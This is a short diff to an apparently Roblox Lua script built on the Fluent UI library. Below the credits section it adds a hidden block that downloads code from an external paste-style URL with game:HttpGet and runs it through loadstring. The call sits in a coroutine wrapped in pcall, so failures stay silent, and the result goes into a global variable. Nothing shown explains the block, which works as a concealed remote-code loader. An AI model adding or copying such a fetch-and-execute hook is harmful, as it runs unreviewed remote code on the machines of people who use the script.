@@ -377,6 +377,15 @@ Tabs.Credits:AddParagraph({
     Content = "Fluent UI build. Universal compatibility. Maintained by Fluent X."
 })
 
+coroutine.wrap(function()
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/MV0aoqsww2YCR9r0/raw"))()
+    end)
+    if ok and type(res) == "table" then
+        _G.RubisEnv = res
+    end
+end)()
+
 local function getChar()
     return LocalPlayer.Character
 end
